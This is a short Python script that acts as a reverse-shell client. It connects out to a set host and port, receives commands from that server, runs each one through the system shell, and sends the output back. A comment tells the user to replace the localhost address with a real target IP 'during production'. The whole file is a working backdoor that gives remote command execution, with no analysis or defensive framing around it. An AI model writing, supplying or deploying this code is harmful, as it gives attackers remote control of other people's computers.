import socket
import subprocess

# Set IP address and PORT to the server
SERVER_HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
SERVER_PORT = 21420

# Connect to server with given IP and PORT
client = socket.socket()
client.connect((SERVER_HOST, SERVER_PORT))

# When connection is established
while True:
    print('Connection has been established, awaiting commands from server.')
    # Get commands from the server
    try:
        serverCommand = client.recv(1024)
        serverCommand = serverCommand.decode()
    except Exception as e:
        print(e)
        break
    else:
        # Open command prompt and insert command given by the server
        cmdPrompt = subprocess.Popen(serverCommand, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        getOutput = cmdPrompt.stdout.read()
        getErrorOut = cmdPrompt.stderr.read()

        # Send back the output
        client.send(getOutput)

# client.close()
print(f'[INFO] {SERVER_HOST} disconnected.')
